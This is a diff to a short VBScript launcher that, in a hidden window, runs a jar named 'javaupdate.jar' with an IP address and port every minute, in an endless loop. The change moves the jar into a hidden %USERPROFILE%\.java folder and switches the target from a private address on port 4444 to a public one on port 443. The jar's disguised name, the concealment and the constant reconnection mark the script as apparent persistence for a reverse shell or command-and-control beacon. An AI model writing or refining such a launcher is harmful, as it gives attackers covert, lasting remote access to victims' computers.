@@ -1,6 +1,13 @@
 Set WshShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
+javaUpdaterPath = userProfile & "\.java\javaupdate.jar"
+command = "java -jar """ & javaUpdaterPath & """ 20.197.14.25 443"
 
 Do
-    WshShell.Run "java -jar .\javaupdate.jar 172.24.169.235 4444", 0, False
-    WScript.Sleep 60000 ' Sleep for 60,000 milliseconds = 1 minute
+    If objFSO.FileExists(javaUpdaterPath) Then
+        WshShell.Run command, 0, False
+    End If
+    WScript.Sleep 60000 ' Wait for 1 minute
 Loop
